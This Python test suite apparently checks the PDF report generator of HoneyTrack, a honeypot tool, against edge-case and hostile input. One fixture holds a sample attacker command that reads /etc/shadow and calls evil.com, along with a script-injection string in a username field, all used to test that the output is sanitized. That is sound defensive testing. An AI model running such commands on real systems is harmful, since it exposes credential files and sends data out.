"""
Unit and integration tests for HoneyTrack PDF Report Generator.
Tests:
1. Normal generation with dictionary data
2. Normal generation with ORM AttackEvent models
3. Datetime objects in timestamp field (regression test)
4. XML / HTML characters in commands, usernames, and search filters
5. Edge cases: None values for risk_score, coords, timestamp, strings
6. Empty events list and empty stats dictionary
7. Authenticated HTTP endpoint /api/reports/pdf across production, demo, and all modes
"""

import sys
import os
from datetime import datetime

BASE_DIR = os.path.dirname(os.path.dirname(os.path.abspath(__file__)))
if BASE_DIR not in sys.path:
    sys.path.insert(0, BASE_DIR)

from reports.pdf_generator import generate_threat_report_pdf
from database.database import SessionLocal
from database.models import AttackEvent


def test_pdf_with_orm_models():
    """Verify PDF generates successfully with SQLAlchemy model instances."""
    db = SessionLocal()
    try:
        events = db.query(AttackEvent).limit(25).all()
        stats = {
            "total_attacks": len(events),
            "unique_ips": len(set(e.source_ip for e in events if e.source_ip)),
            "unique_countries": len(set(e.country for e in events if e.country)),
            "services": {"SSH": 10, "HTTP": 15},
            "top_countries": [{"country": "United States", "count": 20}]
        }
        pdf = generate_threat_report_pdf(stats, events, filter_summary="Test ORM Scope")
        assert isinstance(pdf, bytes)
        assert len(pdf) > 1000
        assert pdf.startswith(b"%PDF")
        print("  -> PASS: PDF generated with SQLAlchemy ORM models")
    finally:
        db.close()


def test_pdf_with_datetime_objects():
    """Verify PDF generates without error when timestamps are datetime.datetime objects."""
    events = [
        {
            "id": 1,
            "timestamp": datetime.utcnow(),
            "source_ip": "192.168.1.100",
            "service": "SSH",
            "username": "root",
            "password": "toor",
            "command": "uname -a",
            "country": "Germany",
            "city": "Frankfurt",
            "isp": "Hetzner",
            "latitude": 50.11,
            "longitude": 8.68,
            "attack_type": "Brute Force",
            "risk_score": 80,
            "is_tor": False,
            "is_demo": False
        }
    ]
    pdf = generate_threat_report_pdf({"total_attacks": 1}, events)
    assert isinstance(pdf, bytes)
    assert pdf.startswith(b"%PDF")
    print("  -> PASS: PDF handles datetime.datetime objects properly")


def test_pdf_with_xml_and_injection_payloads():
    """Verify ReportLab does not crash when commands and inputs contain XML/HTML characters."""
    events = [
        {
            "id": 1,
            "timestamp": datetime.utcnow(),
            "source_ip": "10.10.10.10",
            "service": "HTTP",
            "username": "admin<script>alert(1)</script>",
            "password": "p&ss<123>",
            "command": "cat < /etc/shadow && curl http://evil.com?a=1&b=2<script></b>",
            "user_agent": "Mozilla/5.0 <test>&\"'",
            "country": "US & Canada <corp>",
            "city": "New <York>",
            "isp": "AT&T <telecom>",
            "latitude": 40.71,
            "longitude": -74.00,
            "attack_type": "Command Injection <crit>",
            "risk_score": 90,
            "is_tor": True,
            "is_demo": False
        }
    ]
    pdf = generate_threat_report_pdf(
        {"total_attacks": 1, "services": {"HTTP": 1}},
        events,
        filter_summary="Filter: <tag> & query 'test'"
    )
    assert isinstance(pdf, bytes)
    assert pdf.startswith(b"%PDF")
    print("  -> PASS: PDF correctly sanitizes XML/HTML injection characters")


def test_pdf_with_none_and_missing_fields():
    """Verify PDF generation is resilient against None values for all fields."""
    events = [
        {
            "id": 1,
            "timestamp": None,
            "source_ip": None,
            "service": None,
            "username": None,
            "password": None,
            "command": None,
            "user_agent": None,
            "country": None,
            "city": None,
            "isp": None,
            "latitude": None,
            "longitude": None,
            "attack_type": None,
            "risk_score": None,
            "is_tor": None,
            "is_demo": None
        }
    ]
    pdf = generate_threat_report_pdf({}, events, filter_summary="")
    assert isinstance(pdf, bytes)
    assert pdf.startswith(b"%PDF")
    print("  -> PASS: PDF handles None and missing fields gracefully")


def test_pdf_with_empty_inputs():
    """Verify PDF generates cleanly with empty list and empty stats."""
    pdf = generate_threat_report_pdf({}, [])
    assert isinstance(pdf, bytes)
    assert pdf.startswith(b"%PDF")
    print("  -> PASS: PDF generates with empty telemetry")


def test_api_pdf_endpoint():
    """Verify /api/reports/pdf route works and returns a valid PDF file."""
    from api.app import create_app
    app = create_app()
    client = app.test_client()

    with client.session_transaction() as sess:
        sess["user_id"] = 1

    for mode in ["production", "demo", "all"]:
        res = client.get(f"/api/reports/pdf?mode={mode}")
        assert res.status_code == 200, f"Expected 200 for mode={mode}, got {res.status_code}"
        assert res.mimetype == "application/pdf"
        assert res.data.startswith(b"%PDF")
        print(f"  -> PASS: /api/reports/pdf endpoint works for mode={mode}")


if __name__ == "__main__":
    print("[+] Running PDF Generator Test Suite...")
    test_pdf_with_orm_models()
    test_pdf_with_datetime_objects()
    test_pdf_with_xml_and_injection_payloads()
    test_pdf_with_none_and_missing_fields()
    test_pdf_with_empty_inputs()
    test_api_pdf_endpoint()
    print("[+] All PDF generator tests passed successfully!")
